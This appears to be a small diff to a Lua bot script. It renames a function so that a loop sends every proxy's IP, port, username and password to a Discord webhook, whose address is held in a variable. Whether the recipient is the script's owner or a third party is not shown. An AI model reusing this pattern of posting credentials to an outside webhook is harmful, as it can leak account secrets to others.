@@ -4,7 +4,7 @@ for _,prox in pairs(getProxies()) do
 notifsyn(wbcok,prox.ip..":"..prox.port..":"..prox.username..":"..prox.password)
 end 
 
-function notifsyb(webhookcok,status)
+function notifsyn(webhookcok,status)
         local syn = Webhook.new(webhookcok)
         syn.avatar_url = "https://cdn.discordapp.com/attachments/1180523579381665933/1180577805403181076/20231203_013427.png"
         syn.embed1.use = true 
